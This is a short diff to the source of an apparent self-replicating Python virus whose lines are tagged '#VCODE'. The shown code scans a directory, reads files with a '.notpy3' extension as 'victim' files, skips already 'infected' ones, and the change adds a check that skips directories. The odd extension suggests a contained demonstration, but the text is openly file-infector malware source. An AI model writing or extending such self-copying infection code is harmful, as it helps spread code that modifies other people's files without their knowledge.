@@ -15,6 +15,10 @@ with open(sys.argv[0], "r") as fp:                                      #VCODE
                                                                         #VCODE
 # Iterate through each file/dir.                                        #VCODE
 for entry in dirs:                                                      #VCODE
+    # Do nothing if this is a directory.                                #VCODE
+    if(os.path.isdir(entry)):                                           #VCODE
+        continue                                                        #VCODE
+                                                                        #VCODE
     # Do nothing if the file's extension isn't ".notpy3".               #VCODE
     if(os.path.splitext(entry)[1] != ".notpy3"):                        #VCODE
         continue                                                        #VCODE
@@ -23,7 +27,7 @@ for entry in dirs:                                                      #VCODE
     with open(entry, "r") as fp:                                        #VCODE
         victim = fp.read()                                              #VCODE
                                                                         #VCODE
-    # Also do nothing if the victim is already infected.                #VCODE
+    # Do nothing if the victim is already infected.                     #VCODE
     if(victim.find("#VCODE") != -1):                                    #VCODE
         print("Script {} is already infected...".format(entry))         #VCODE
         continue                                                        #VCODE
